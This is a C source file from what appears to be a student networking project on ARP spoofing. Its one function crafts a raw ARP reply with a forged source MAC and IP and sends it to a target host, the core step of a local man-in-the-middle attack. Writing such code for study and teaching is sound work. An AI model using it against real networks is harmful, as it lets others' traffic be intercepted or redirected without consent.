/*
** EPITECH PROJECT, 2018
** NWP_myarpspoof_2018
** File description:
** spoof.c
*/

#include "arpspoofing.h"

int send_spoof(arp_t *arp, int fd, int ifindex, char *src_mac,
    uint32_t src_ip, uint32_t dst_ip)
{
    unsigned char buffer[BUF_SIZE];
    ssize_t ret = 0;
    struct ethhdr *send_req = (struct ethhdr *)buffer;
    arphdr_t *arp_req = (arphdr_t *)(buffer + ETH2_LEN);
    struct sockaddr_ll socket_address;

    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_hatype = htons(ARPHRD_ETHER);
    socket_address.sll_pkttype = (PACKET_BROADCAST);
    socket_address.sll_halen = MAC_LEN;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;

    memset(buffer, 0, sizeof(buffer));
    memcpy(send_req->h_dest, arp->target_mac, MAC_LEN);
    memcpy(arp_req->dest_mac, arp->target_mac, MAC_LEN);
    memcpy(send_req->h_source, src_mac, MAC_LEN);
    memcpy(arp_req->src_mac, src_mac, MAC_LEN);
    memcpy(socket_address.sll_addr, src_mac, MAC_LEN);

    send_req->h_proto = htons(ETH_P_ARP);
    arp_req->hardware_type = htons(HW_TYPE);
    arp_req->protocol_type = htons(ETH_P_IP);
    arp_req->hardware_len = MAC_LEN;
    arp_req->protocol_len = IPV4_LEN;
    arp_req->opcode = htons(ARP_REPLY);

    memcpy(arp_req->src_ip, &src_ip, sizeof(uint32_t));
    memcpy(arp_req->dest_ip, &dst_ip, sizeof(uint32_t));

    ret = sendto(fd, buffer, 42, 0, (struct sockaddr *) &socket_address, sizeof(socket_address));
    if (ret == -1)
        error("Sendto failed");

    printf("Spoofed packet sent to '%s'\n", arp->dest);
    sleep(1);

    return (0);
}